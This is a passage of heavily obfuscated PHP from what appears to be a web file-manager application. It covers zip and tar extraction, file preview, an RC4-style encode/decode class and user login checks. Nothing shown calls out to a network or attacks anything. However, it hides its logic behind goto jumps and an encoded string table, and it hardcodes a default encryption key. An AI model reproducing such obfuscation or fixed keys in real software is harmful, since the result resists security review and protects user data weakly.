DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d¡ç‹¸¡[1917], PCLZIP_OPT_BY_NAME, $F¢£éÍÅÉÃ[$d¡ç‹¸¡[1912]], PCLZIP_OPT_REMOVE_PATH, $AÒ¬¸Íí…, PCLZIP_OPT_REPLACE_NEWER); } else { $CÜÀ‹µâç­ = $D¢ØÅ´½‰ƒ->extract(PCLZIP_OPT_PATH, $càˆê½ˆä, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d¡ç‹¸¡[1917], PCLZIP_OPT_REPLACE_NEWER); } return array($d¡ç‹¸¡[1023] => $CÜÀ‹µâç­, $d¡ç‹¸¡[1025] => $D¢ØÅ´½‰ƒ->errorName(!0)); } } } return array($d¡ç‹¸¡[1023] => !1, $d¡ç‹¸¡[1025] => $d¡ç‹¸¡[1918]); goto e•ÄÚ ¿”°; fÍ‚à¬š¡Ò: $F¬ï‡‰Œ¬ = self::listContent($CÉùÒ“Ê¿Ğ, !1); if (!$F¬ï‡‰Œ¬[$d¡ç‹¸¡[1023]]) { return $F¬ï‡‰Œ¬; } if ($AÇ•Û¬ó¯ != $d¡ç‹¸¡[1022]) { goto b±¼Ï‡¹³Œ; CÛö¿ÃÕÁ±: if ($GLOBALS[$d¡ç‹¸¡[16]][$d¡ç‹¸¡[1144]] != $d¡ç‹¸¡[337]) { $a›ÆÑÙÛ§Ã = unzip_pre_name($A¦’Í¾¤‰); } $AÒ¬¸Íí… = get_path_father($A¦’Í¾¤‰); if ($AÒ¬¸Íí… == $A¦’Í¾¤‰) { $AÒ¬¸Íí… = $d¡ç‹¸¡[43]; } goto eÍ‰í¾šîí; b±¼Ï‡¹³Œ: $F¢£éÍÅÉÃ = self::fileIndex($F¬ï‡‰Œ¬[$d¡ç‹¸¡[1025]], $AÇ•Û¬ó¯); $A¦’Í¾¤‰ = str_replace(array($d¡ç‹¸¡[1063], $d¡ç‹¸¡[1914]), $d¡ç‹¸¡[82], $F¢£éÍÅÉÃ[$d¡ç‹¸¡[1912]]); $a›ÆÑÙÛ§Ã = $A¦’Í¾¤‰; goto CÛö¿ÃÕÁ±; eÍ‰í¾šîí: if ($F¢£éÍÅÉÃ[$d¡ç‹¸¡[88]]) { $a›ÆÑÙÛ§Ã = rtrim($a›ÆÑÙÛ§Ã, $d¡ç‹¸¡[18]) . $d¡ç‹¸¡[18]; $A¦’Í¾¤‰ = array($A¦’Í¾¤‰); } $eæÏÖçëî = str_replace($d¡ç‹¸¡[105], $d¡ç‹¸¡[18], $a›ÆÑÙÛ§Ã); if (substr($eæÏÖçëî, -1) == $d¡ç‹¸¡[18]) { if (!strstr(trim($eæÏÖçëî, $d¡ç‹¸¡[18]), $d¡ç‹¸¡[18])) { $càˆê½ˆä = $càˆê½ˆä . get_path_this($eæÏÖçëî) . $d¡ç‹¸¡[18]; } } else { if ($AÒ¬¸Íí… == $a›ÆÑÙÛ§Ã) { $AÒ¬¸Íí… = $d¡ç‹¸¡[43]; } } goto C×ç¶æï; C×ç¶æï: } goto fÄˆÔŠÜâ®; e•ÄÚ ¿”°: } static function fileIndex($B¯«¨Ï¥–’, $d¿îĞÈ ¶Ã, $b¨÷©Ì¨„Ü = false) { goto dÃºôëš; bÛôØ´Ôë: $bœÉõÙ¹Óê = $BÈØÓË÷²ˆ; if ($b¨÷©Ì¨„Ü) { $bœÉõÙ¹Óê = $BÈØÓË÷²ˆ[$b¨÷©Ì¨„Ü]; if ($BÈØÓË÷²ˆ[$AÈ´‘­†[88]]) { $bœÉõÙ¹Óê = rtrim($bœÉõÙ¹Óê, $AÈ´‘­†[18]) . $AÈ´‘­†[18]; } } return $bœÉõÙ¹Óê; goto D„¥°î ïØ; f·†¤šÊ„İ: $A±ŒñÏÑİˆ = count($B¯«¨Ï¥–’); for ($B×ã”Â‡Å = 0; $B×ã”Â‡Å < $A±ŒñÏÑİˆ; $B×ã”Â‡Å++) { if ($d¿îĞÈ ¶Ã == $B¯«¨Ï¥–’[$B×ã”Â‡Å][$AÈ´‘­†[1027]]) { $BÈØÓË÷²ˆ = $B¯«¨Ï¥–’[$B×ã”Â‡Å]; break; } } if (!$BÈØÓË÷²ˆ) { show_tips($AÈ´‘­†[1919]); } goto bÛôØ´Ôë; dÃºôëš: $AÈ´‘­† =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); if (!is_array($B¯«¨Ï¥–’)) { return !1; } goto f·†¤šÊ„İ; D„¥°î ïØ: } static function extractZipFile($cŠ•Ñ…±“, $AöªÑÅ§ñ£, $BİË‚ëç = false) { goto cîµ«—ÂÑÀ; c˜¡•µÔÕÓ: if (!file_exists($C„°Şƒø¦©)) { return !1; } @rename($C„°Şƒø¦©, $DÕŠµ£´ï); return $DÕŠµ£´ï; goto D‡„×±²œ; cîµ«—ÂÑÀ: $B®ø†øÀ°ù =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); $bÍ´”»Ï‰Ü = TEMP_FILES . hash_path($cŠ•Ñ…±“) . $B®ø†øÀ°ù[18]; goto CÂ¿¸–ÌÌÌ; E¦Ÿ Àªôø: if (file_exists($DÕŠµ£´ï)) { return $DÕŠµ£´ï; } $D¹ã‹ïæĞ = new PclZip($cŠ•Ñ…±“); $C„°Şƒø¦© = unzip_filter_ext($bÍ´”»Ï‰Ü . get_path_this($AöªÑÅ§ñ£)); goto AáµÄšõ‡ß; AáµÄšõ‡ß: $Bµ®Êå³ = get_path_father($AöªÑÅ§ñ£); if ($Bµ®Êå³ == $AöªÑÅ§ñ£) { $Bµ®Êå³ = $B®ø†øÀ°ù[43]; } $fÍÀŠç¾• = $D¹ã‹ïæĞ->extract(PCLZIP_OPT_PATH, $bÍ´”»Ï‰Ü, PCLZIP_CB_PRE_FILE_NAME, $B®ø†øÀ°ù[1917], PCLZIP_OPT_REMOVE_PATH, $Bµ®Êå³, PCLZIP_OPT_BY_NAME, $AöªÑÅ§ñ£); goto c˜¡•µÔÕÓ; CÂ¿¸–ÌÌÌ: mk_dir($bÍ´”»Ï‰Ü); $DÕŠµ£´ï = $bÍ´”»Ï‰Ü . md5($cŠ•Ñ…±“ . $AöªÑÅ§ñ£); if ($BİË‚ëç) { $DÕŠµ£´ï = $bÍ´”»Ï‰Ü . $BİË‚ëç; } goto E¦Ÿ Àªôø; D‡„×±²œ: } static function filePreview($b¦ª¤æ×Á¿, $cšÀ‡•ßğ§, $f®ƒ†ŠÛ¢Ê = false, $cõ„öÕìè¢ = false) { goto fˆ‰ª±ê–à; a÷âÔ†–œ: if (!file_exists($EâØ¸Ó¨¬²)) { del_dir($EÙ¹¸×Š…õ); show_json($DÍÜÓ²ëÂÌ[1922]); } IO::fileOut($EâØ¸Ó¨¬², $f®ƒ†ŠÛ¢Ê, $Eì¡¥È±Ú‰); goto e—êß‰ğáâ; Bàí”Úïñ: if (!$câÏàÙËŠŒ[$DÍÜÓ²ëÂÌ[1023]]) { show_json($câÏàÙËŠŒ[$DÍÜÓ²ëÂÌ[1025]], !1); } if (!file_exists($fµ‚ÜÌì²ç)) { show_json($DÍÜÓ²ëÂÌ[1921], !1); } @rename($fµ‚ÜÌì²ç, $EâØ¸Ó¨¬²); goto a÷âÔ†–œ; fˆ‰ª±ê–à: $DÍÜÓ²ëÂÌ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); $EÙ¹¸×Š…õ = TEMP_FILES . hash_path($b¦ª¤æ×Á¿) . $DÍÜÓ²ëÂÌ[18]; goto fŒ„«à¤ãÙ; càÜÔƒƒŞ: $bğÌ‰¡ÒÈ° = unzip_pre_name($bğÌ‰¡ÒÈ°); $Eì¡¥È±Ú‰ = get_path_this($bğÌ‰¡ÒÈ°); $fµ‚ÜÌì²ç = unzip_filter_ext($EÙ¹¸×Š…õ . $Eì¡¥È±Ú‰); goto Bàí”Úïñ; AâäÁˆÄ›: $câÏàÙËŠŒ = self::extract($b¦ª¤æ×Á¿, $EÙ¹¸×Š…õ, $cšÀ‡•ßğ§, $bğÌ‰¡ÒÈ°); if (is_array($bğÌ‰¡ÒÈ°)) { show_json($DÍÜÓ²ëÂÌ[1920], !1); } if (file_exists($EâØ¸Ó¨¬²)) { IO::fileOut($EâØ¸Ó¨¬², $f®ƒ†ŠÛ¢Ê, get_path_this($bğÌ‰¡ÒÈ°)); return; } goto càÜÔƒƒŞ; fŒ„«à¤ãÙ: mk_dir($EÙ¹¸×Š…õ); $EâØ¸Ó¨¬² = $EÙ¹¸×Š…õ . md5($b¦ª¤æ×Á¿ . $cšÀ‡•ßğ§ . $cõ„öÕìè¢); $bğÌ‰¡ÒÈ° = $DÍÜÓ²ëÂÌ[43]; goto AâäÁˆÄ›; e—êß‰ğáâ: } static function create($D’ğì…®…Ñ, $D¥ˆÕãç¸ã) { $C‘ƒÓØ’“ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); $bÏïÎÛÀŒÂ = get_path_ext($D’ğì…®…Ñ); $fÃ˜ã¨˜  = !1; if (self::checkIfType($bÏïÎÛÀŒÂ, $C‘ƒÓØ’“[312])) { if (kodZipArchive::support($C‘ƒÓØ’“[1002])) { return kodZipArchive::create($D’ğì…®…Ñ, $D¥ˆÕãç¸ã); } $f™Ì°ÒáÑƒ = new PclZip($D’ğì…®…Ñ); foreach ($D¥ˆÕãç¸ã as $B’ˆÛ°…Ê™ => $dõÇ„ÔäÑ) { $dõÇ„ÔäÑ = str_replace($C‘ƒÓØ’“[480], $C‘ƒÓØ’“[18], $dõÇ„ÔäÑ); $e×ãä½›ÉÖ = Kodio::clear(get_path_father($dõÇ„ÔäÑ)); if ($B’ˆÛ°…Ê™ == 0) { $fÃ˜ã¨˜  = $f™Ì°ÒáÑƒ->create($dõÇ„ÔäÑ, PCLZIP_OPT_REMOVE_PATH, $e×ãä½›ÉÖ, PCLZIP_CB_PRE_FILE_NAME, $C‘ƒÓØ’“[1923]); continue; } $fÃ˜ã¨˜  = $f™Ì°ÒáÑƒ->add($dõÇ„ÔäÑ, PCLZIP_OPT_REMOVE_PATH, $e×ãä½›ÉÖ, PCLZIP_CB_PRE_FILE_NAME, $C‘ƒÓØ’“[1923]); } } else { if (self::checkIfType($bÏïÎÛÀŒÂ, $C‘ƒÓØ’“[1894])) { foreach ($D¥ˆÕãç¸ã as $B’ˆÛ°…Ê™ => $dõÇ„ÔäÑ) { $dõÇ„ÔäÑ = str_replace($C‘ƒÓØ’“[480], $C‘ƒÓØ’“[18], $dõÇ„ÔäÑ); $e×ãä½›ÉÖ = Kodio::clear(get_path_father($dõÇ„ÔäÑ)); if ($B’ˆÛ°…Ê™ == 0) { $fÃ˜ã¨˜  = PclTarCreate($D’ğì…®…Ñ, array($dõÇ„ÔäÑ), $bÏïÎÛÀŒÂ, null, $e×ãä½›ÉÖ); continue; } $fÃ˜ã¨˜  = PclTarAddList($D’ğì…®…Ñ, array($dõÇ„ÔäÑ), $C‘ƒÓØ’“[43], $e×ãä½›ÉÖ, $bÏïÎÛÀŒÂ); } } } return $fÃ˜ã¨˜ ; } } class Mcrypt { public static $defaultKey = "\x61\x21\x74\x61\153\101\x3a\144\154\x6d\x63\x6c\144\105\x76\54\x65"; public static function encode($fê¸£“ã“, $E¥ƒ‹‘¹Äô = '', $aõµ³ï Óœ = 0, $f±¹É¡‚•Œ = '') { goto FõÕ…¶…¦‘; f‘”ŠâÍÃï: $fê¸£“ã“ = sprintf($C³ôÜÛÙµ•[1924], $aõµ³ï Óœ ? $aõµ³ï Óœ + time() : 0) . substr(md5($fê¸£“ã“ . $C¨‡“åñË), 0, 16) . $fê¸£“ã“; $AÅ½ª¡ƒ § = strlen($fê¸£“ã“); $A³ª³‰Ø = array(); goto a‘ÖÏåîŞ; a·ˆ¿ä Ş: $CĞß‰¹’®Ä = $C³ôÜÛÙµ•[43]; for ($AòåÂ«‹ùÒ = $F¸¥«º…ò› = $FçŸ Åô¼Î = 0; $FçŸ Åô¼Î < $AÅ½ª¡ƒ §; $FçŸ Åô¼Î++) { $AòåÂ«‹ùÒ = ($AòåÂ«‹ùÒ + 1) % 256; $F¸¥«º…ò› = ($F¸¥«º…ò› + $Bµ®’·ØÊ[$AòåÂ«‹ùÒ]) % 256; $FÄèç¶˜Ü = $Bµ®’·ØÊ[$AòåÂ«‹ùÒ]; $Bµ®’·ØÊ[$AòåÂ«‹ùÒ] = $Bµ®’·ØÊ[$F¸¥«º…ò›]; $Bµ®’·ØÊ[$F¸¥«º…ò›] = $FÄèç¶˜Ü; $CĞß‰¹’®Ä .= chr(ord($fê¸£“ã“[$FçŸ Åô¼Î]) ^ $Bµ®’·ØÊ[($Bµ®’·ØÊ[$AòåÂ«‹ùÒ] + $Bµ®’·ØÊ[$F¸¥«º…ò›]) % 256]); } $CĞß‰¹’®Ä = $b¼…àçĞé· . str_replace($C³ôÜÛÙµ•[897], $C³ôÜÛÙµ•[43], base64_encode($CĞß‰¹’®Ä)); goto D´ï–¨Ïëğ; a‘ÖÏåîŞ: for ($FçŸ Åô¼Î = 0; $FçŸ Åô¼Î <= 255; $FçŸ Åô¼Î++) { $A³ª³‰Ø[$FçŸ Åô¼Î] = ord($eêä¦œŠİæ[$FçŸ Åô¼Î % $EˆÎ’İ†ø‡]); } $Bµ®’·ØÊ = range(0, 255); for ($F¸¥«º…ò› = $FçŸ Åô¼Î = 0; $FçŸ Åô¼Î < 256; $FçŸ Åô¼Î++) { $F¸¥«º…ò› = ($F¸¥«º…ò› + $Bµ®’·ØÊ[$FçŸ Åô¼Î] + $A³ª³‰Ø[$FçŸ Åô¼Î]) % 256; $FÄèç¶˜Ü = $Bµ®’·ØÊ[$FçŸ Åô¼Î]; $Bµ®’·ØÊ[$FçŸ Åô¼Î] = $Bµ®’·ØÊ[$F¸¥«º…ò›]; $Bµ®’·ØÊ[$F¸¥«º…ò›] = $FÄèç¶˜Ü; } goto a·ˆ¿ä Ş; aÁ¹ŠŠÖ¶·: $Fè÷ËÁÔ¿ = md5(substr($E¥ƒ‹‘¹Äô, 0, 16)); $C¨‡“åñË = md5(substr($E¥ƒ‹‘¹Äô, 16, 16)); $f±¹É¡‚•Œ = $f±¹É¡‚•Œ ? $f±¹É¡‚•Œ : md5(microtime()); goto D­·Ì«ŠÇ; D´ï–¨Ïëğ: $CĞß‰¹’®Ä = str_replace(array($C³ôÜÛÙµ•[295], $C³ôÜÛÙµ•[18], $C³ôÜÛÙµ•[897]), array($C³ôÜÛÙµ•[423], $C³ôÜÛÙµ•[82], $C³ôÜÛÙµ•[103]), $CĞß‰¹’®Ä); return $CĞß‰¹’®Ä; goto bå©Šíõï; D­·Ì«ŠÇ: $b¼…àçĞé· = substr($f±¹É¡‚•Œ, -$aìêí®Ù´ª); $eêä¦œŠİæ = $Fè÷ËÁÔ¿ . md5($Fè÷ËÁÔ¿ . $b¼…àçĞé·); $EˆÎ’İ†ø‡ = strlen($eêä¦œŠİæ); goto f‘”ŠâÍÃï; FõÕ…¶…¦‘: $C³ôÜÛÙµ• =& $_SERVER[¹÷ˆ§éÒ°ú]; $aìêí®Ù´ª = 4; $E¥ƒ‹‘¹Äô = md5($E¥ƒ‹‘¹Äô ? $E¥ƒ‹‘¹Äô : self::$defaultKey); goto aÁ¹ŠŠÖ¶·; bå©Šíõï: } public static function decode($dÈÆ…ô†œ°, $cŠŸÏØæ¹ = '') { goto B‹˜–ŒÊŠ†; d—ÒÇì²Ò°: $c¡ƒùÑ’² = $DÔÆğ—ô˜’[43]; for ($aõø”³‚­ì = $c¸…’Ì¯…å = $c‚Èé†‰³ = 0; $c‚Èé†‰³ < $Eèù¿ìİÇÌ; $c‚Èé†‰³++) { $aõø”³‚­ì = ($aõø”³‚­ì + 1) % 256; $c¸…’Ì¯…å = ($c¸…’Ì¯…å + $C·°™ìçù‰[$aõø”³‚­ì]) % 256; $FÙîŠÕÏ = $C·°™ìçù‰[$aõø”³‚­ì]; $C·°™ìçù‰[$aõø”³‚­ì] = $C·°™ìçù‰[$c¸…’Ì¯…å]; $C·°™ìçù‰[$c¸…’Ì¯…å] = $FÙîŠÕÏ; $c¡ƒùÑ’² .= chr(ord($dÈÆ…ô†œ°[$c‚Èé†‰³]) ^ $C·°™ìçù‰[($C·°™ìçù‰[$aõø”³‚­ì] + $C·°™ìçù‰[$c¸…’Ì¯…å]) % 256]); } $e²‡·Êğø© = intval(substr($c¡ƒùÑ’², 0, 10)); goto fÓ‹ìƒí; bîêèõ’‘•: for ($c‚Èé†‰³ = 0; $c‚Èé†‰³ <= 255; $c‚Èé†‰³++) { $B›•©®„ƒ¹[$c‚Èé†‰³] = ord($e‡óÖ‹¡—[$c‚Èé†‰³ % $C™ˆ½Ûª¬®]); } $C·°™ìçù‰ = range(0, 255); for ($c¸…’Ì¯…å = $c‚Èé†‰³ = 0; $c‚Èé†‰³ < 256; $c‚Èé†‰³++) { $c¸…’Ì¯…å = ($c¸…’Ì¯…å + $C·°™ìçù‰[$c‚Èé†‰³] + $B›•©®„ƒ¹[$c‚Èé†‰³]) % 256; $FÙîŠÕÏ = $C·°™ìçù‰[$c‚Èé†‰³]; $C·°™ìçù‰[$c‚Èé†‰³] = $C·°™ìçù‰[$c¸…’Ì¯…å]; $C·°™ìçù‰[$c¸…’Ì¯…å] = $FÙîŠÕÏ; } goto d—ÒÇì²Ò°; B‹˜–ŒÊŠ†: $DÔÆğ—ô˜’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÈÆ…ô†œ° = str_replace(array($DÔÆğ—ô˜’[423], $DÔÆğ—ô˜’[82], $DÔÆğ—ô˜’[103]), array($DÔÆğ—ô˜’[295], $DÔÆğ—ô˜’[18], $DÔÆğ—ô˜’[897]), $dÈÆ…ô†œ°); $FˆäÊê„¨ğ = 4; goto e‡É«áÙã; e‡É«áÙã: $cŠŸÏØæ¹ = md5($cŠŸÏØæ¹ ? $cŠŸÏØæ¹ : self::$defaultKey); $EÆùŒÛ±ÜÈ = md5(substr($cŠŸÏØæ¹, 0, 16)); $aÉ£Å÷ÃÅ™ = md5(substr($cŠŸÏØæ¹, 16, 16)); goto e¶ªçºèŒ—; fÓ‹ìƒí: if (($e²‡·Êğø© == 0 || $e²‡·Êğø© - time() > 0) && substr($c¡ƒùÑ’², 10, 16) == substr(md5(substr($c¡ƒùÑ’², 26) . $aÉ£Å÷ÃÅ™), 0, 16)) { return substr($c¡ƒùÑ’², 26); } else { return $DÔÆğ—ô˜’[43]; } goto cã¦ÔÕ……; DåÅ’ˆÃÙ®: $dÈÆ…ô†œ° = base64_decode(substr($dÈÆ…ô†œ°, $FˆäÊê„¨ğ)); $Eèù¿ìİÇÌ = strlen($dÈÆ…ô†œ°); $B›•©®„ƒ¹ = array(); goto bîêèõ’‘•; e¶ªçºèŒ—: $d¬¶·âÙ†™ = substr($dÈÆ…ô†œ°, 0, $FˆäÊê„¨ğ); $e‡óÖ‹¡— = $EÆùŒÛ±ÜÈ . md5($EÆùŒÛ±ÜÈ . $d¬¶·âÙ†™); $C™ˆ½Ûª¬® = strlen($e‡óÖ‹¡—); goto DåÅ’ˆÃÙ®; cã¦ÔÕ……: } } goto cë—ÜÃà±‘; cë—ÜÃà±‘: define($_SERVER[¹÷ˆ§éÒ°ú][1925], 1); define($_SERVER[¹÷ˆ§éÒ°ú][1926], 2); define($_SERVER[¹÷ˆ§éÒ°ú][1927], 3); goto e½á¤œÈ‹ƒ; Dù¼†‹İˆÛ: define($_SERVER[¹÷ˆ§éÒ°ú][0], $_SERVER[¹÷ˆ§éÒ°ú][1]); $_SERVER[Œá²] = explode($_SERVER[¹÷ˆ§éÒ°ú][2], gzinflate(substr($_SERVER[¹÷ˆ§éÒ°ú][3], 10, -8))); function Model($c‰º³ŠçàÂ = '', $F“Ô’»Ä­Û = '', $aŠÒˆÈ×Ó¼ = '') { goto A½ˆ¢¨‡–; A½ˆ¢¨‡–: $DÑÌàÀÀ¤ =& $_SERVER[Œá²]; static $Dàê¶÷›½Â = array(); $Cí¯Û¿•®È = strtolower($F“Ô’»Ä­Û . $DÑÌàÀÀ¤[0] . $c‰º³ŠçàÂ); goto bãÌ©‹òƒº; FŞĞÏ×Àß: $Dàê¶÷›½Â[$Cí¯Û¿•®È] = new ModelBase($c‰º³ŠçàÂ, $F“Ô’»Ä­Û, $aŠÒˆÈ×Ó¼); return $Dàê¶÷›½Â[$Cí¯Û¿•®È]; goto E‹¦İ½±²à; bãÌ©‹òƒº: if (isset($Dàê¶÷›½Â[$Cí¯Û¿•®È])) { return $Dàê¶÷›½Â[$Cí¯Û¿•®È]; } if ($c‰º³ŠçàÂ) { $c‰º³ŠçàÂ = strtoupper($c‰º³ŠçàÂ[0]) . substr($c‰º³ŠçàÂ, 1); $f¾š¬Ò¨‹ = $c‰º³ŠçàÂ . $DÑÌàÀÀ¤[1]; if (class_exists($f¾š¬Ò¨‹)) { $Dàê¶÷›½Â[$Cí¯Û¿•®È] = new $f¾š¬Ò¨‹(); return $Dàê¶÷›½Â[$Cí¯Û¿•®È]; } } if (!$aŠÒˆÈ×Ó¼) { $aŠÒˆÈ×Ó¼ = $GLOBALS[$DÑÌàÀÀ¤[2]][$DÑÌàÀÀ¤[3]]; } goto FŞĞÏ×Àß; E‹¦İ½±²à: } goto b‘ÛíÇ¯å; FÈŒÀëÁšÀ: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\145" => "\x75\x73\x65\x72\137\155\x65\x74\x61", "\155\x65\164\x61\x46\x69\x65\154\x64" => "\165\163\145\162\x49\x44"); protected $simpleField = "\x75\x73\x65\x72\x49\x44\54\156\151\143\x6b\x4e\141\x6d\x65\54\x6e\x61\155\x65\54\x61\166\x61\164\x61\x72\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($B¿ ƒõå¡) { $C„Öë†ÃŞ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e¿¬®ºè¾ = $C„Öë†ÃŞ[2500]; return array($C„Öë†ÃŞ[2167] => array($B¿ ƒõå¡[0], $e¿¬®ºè¾), $C„Öë†ÃŞ[2169] => array($B¿ ƒõå¡[0], $e¿¬®ºè¾), $C„Öë†ÃŞ[2501] => array($B¿ ƒõå¡[0], $e¿¬®ºè¾)); } protected function getInfo($B¦‡°˜ÍÛâ, $b··¸Ê®é× = false) { $f””Ê§– = $this->getInfoSimple($B¦‡°˜ÍÛâ); if (!is_array($f””Ê§–)) { return array(); } if ($b··¸Ê®é×) { return $this->_getInfoApply($f””Ê§–); } return $this->cacheFunctionGet($_SERVER[¹÷ˆ§éÒ°ú][2223], $B¦‡°˜ÍÛâ); } protected function getInfoFull($AöÊ”¤èŠ£, $BÜ…£®‰Â´ = false) { $D½âÀ÷™®ƒ = $this->getInfoSimple($AöÊ”¤èŠ£); if (!is_array($D½âÀ÷™®ƒ)) { return array(); } if ($BÜ…£®‰Â´) { return $this->_getInfoApply($D½âÀ÷™®ƒ, !0); return $this->_getInfoApply($D½âÀ÷™®ƒ, !0); } return $this->cacheFunctionGet($_SERVER[¹÷ˆ§éÒ°ú][2502], $AöÊ”¤èŠ£); } private function _getInfoApply($c‹¶÷„Õ, $AãŒö”Ç‡ƒ = false) { goto DÉ³ÎùÔ¥; Eì“ÔÂÇÊÌ: $c‹¶÷„Õ = $this->_listDataApplyItem($c‹¶÷„Õ); $fšÃèÒ¢ = Model($b˜«¨¸°äË[1108])->metaGet($c‹¶÷„Õ[$b˜«¨¸°äË[402]][$b˜«¨¸°äË[380]]); $c‹¶÷„Õ[$b˜«¨¸°äË[2505]] = $aÕÛ –ç’; goto b¥öµ‚½Öò; DÉ³ÎùÔ¥: $b˜«¨¸°äË =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$c‹¶÷„Õ) { return $c‹¶÷„Õ; } $aÕÛ –ç’ = md5($b˜«¨¸°äË[2503] . $c‹¶÷„Õ[$b˜«¨¸°äË[792]] . $b˜«¨¸°äË[2504] . $c‹¶÷„Õ[$b˜«¨¸°äË[38]]); goto Eì“ÔÂÇÊÌ; b¥öµ‚½Öò: $c‹¶÷„Õ[$b˜«¨¸°äË[402]][$b˜«¨¸°äË[2340]] = isset($fšÃèÒ¢[$b˜«¨¸°äË[2341]]) ? $fšÃèÒ¢[$b˜«¨¸°äË[2341]] : null; if ($AãŒö”Ç‡ƒ) { $c‹¶÷„Õ[$b˜«¨¸°äË[428]] = $this->metaGet($c‹¶÷„Õ[$b˜«¨¸°äË[1427]]); } return $c‹¶÷„Õ; goto cÔäïó©Ü²; cÔäïó©Ü²: } protected function getInfoSimple($DŞ’ØÊìùº, $AàŠ¦¤–Öø = false) { $cº†Ÿà¦Ë =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$DŞ’ØÊìùº) { return array(); } if ($AàŠ¦¤–Öø) { $A¹¶­¶ßå = $this->where(array($cº†Ÿà¦Ë[1427] => intval($DŞ’ØÊìùº)))->find(); if (!is_array($A¹¶­¶ßå)) { return array(); } $A¹¶­¶ßå[$cº†Ÿà¦Ë[2506]] = Action($cº†Ÿà¦Ë[2507])->parseUrl($A¹¶­¶ßå[$cº†Ÿà¦Ë[2506]]); return $A¹¶­¶ßå; } return $this->cacheFunctionGet($cº†Ÿà¦Ë[2170], $DŞ’ØÊìùº); } protected function getInfoSimpleOuter($b¸èª–ÀŠå) { goto eºíÇ™áÊ; f†ª¡„®Ñ: return $Eô·»¿åµÈ; goto AÍøÜÑŒĞÓ; eºíÇ™áÊ: $b›Ù÷ªŠ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$b¸èª–ÀŠå || $b¸èª–ÀŠå == 0) { return array($b›Ù÷ªŠ[1427] => $b›Ù÷ªŠ[481], $b›Ù÷ªŠ[38] => $b›Ù÷ªŠ[169] . LNG($b›Ù÷ªŠ[2508]) . $b›Ù÷ªŠ[489], $b›Ù÷ªŠ[2506] => STATIC_PATH . $b›Ù÷ªŠ[2509]); } $BÑ­ã¸Õ…š = $this->cacheFunctionGet($b›Ù÷ªŠ[2170], $b¸èª–ÀŠå); goto B®…²©°Ûª; B®…²©°Ûª: $Eô·»¿åµÈ = array_field_key($BÑ­ã¸Õ…š, explode($b›Ù÷ªŠ[57], $this->simpleField)); if (!$Eô·»¿åµÈ) { return array($b›Ù÷ªŠ[1427] => $b›Ù÷ªŠ[1022], $b›Ù÷ªŠ[38] => $b›Ù÷ªŠ[169] . LNG($b›Ù÷ªŠ[2510]) . $b›Ù÷ªŠ[489], $b›Ù÷ªŠ[2506] => STATIC_PATH . $b›Ù÷ªŠ[2511]); } $Eô·»¿åµÈ[$b›Ù÷ªŠ[2506]] = Action($b›Ù÷ªŠ[2507])->parseUrl($Eô·»¿åµÈ[$b›Ù÷ªŠ[2506]]); goto f†ª¡„®Ñ; AÍøÜÑŒĞÓ: } protected function groupUser($D†àí¾ˆ‡) { } public static function errorLang($AºƒÈÑï¼Ã) { $d¿ç©Ñ„»Ú =& $_SERVER[¹÷ˆ§éÒ°ú]; $fì¬ŒÑ­ØŠ = array(self::ERROR_USER_NOT_EXISTS => $d¿ç©Ñ„»Ú[2512], self::ERROR_USER_PASSWORD_ERROR => $d¿ç©Ñ„»Ú[2513], self::ERROR_USER_EXIST_NAME => $d¿ç©Ñ„»Ú[2514], self::ERROR_USER_EXIST_PHONE => $d¿ç©Ñ„»Ú[2515], self::ERROR_USER_EXIST_EMAIL => $d¿ç©Ñ„»Ú[2516], self::ERROR_USER_LOGIN_LOCK => $d¿ç©Ñ„»Ú[2517], self::ERROR_IP_NOT_ALLOW => $d¿ç©Ñ„»Ú[2518], self::ERROR_USER_EXIST_NICKNAME => $d¿ç©Ñ„»Ú[2519]); return LNG($fì¬ŒÑ­ØŠ[$AºƒÈÑï¼Ã]); } public function getInfoByMeta($FèĞ¤öÂŞÏ, $BÃŸÓ®´¡Ö) { $fŠÉô¾ĞŸâ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÆ¼×‘ÔâÃ = Model($fŠÉô¾ĞŸâ[2520])->where(array($fŠÉô¾ĞŸâ[101] => $FèĞ¤öÂŞÏ, $fŠÉô¾ĞŸâ[370] => $BÃŸÓ®´¡Ö))->find(); if ($EÆ¼×‘ÔâÃ) { return $this->getInfo($EÆ¼×‘ÔâÃ[$fŠÉô¾ĞŸâ[1427]]); } return !1; } public function userLoginCheck($E–»Û¶Ï–ª, $bÅí­‰íŒœ) { goto Eã¹¹Äº©; fí°Öà×›´: $B½˜çõÖÄƒ = $this->where($aÃÊº©­¿¬)->find(); if (!$B½˜çõÖÄƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($B½˜çõÖÄƒ[$DÜƒšÃØØè[1427]], $bÅí­‰íŒœ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto CÆˆ¥„˜Ò; Eã¹¹Äº©: $DÜƒšÃØØè =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÃÊº©­¿¬ = array($DÜƒšÃØØè[38] => $E–»Û¶Ï–ª, $DÜƒšÃØØè[2344] => $E–»Û¶Ï–ª, $DÜƒšÃØØè[304] => $E–»Û¶Ï–ª, $DÜƒšÃØØè[2521] => $E–»Û¶Ï–ª, $DÜƒšÃØØè[904] => $DÜƒšÃØØè[906]); if ($this->nickNameRpt()) { unset($aÃÊº©­¿¬[$DÜƒšÃØØè[2344]]); } goto 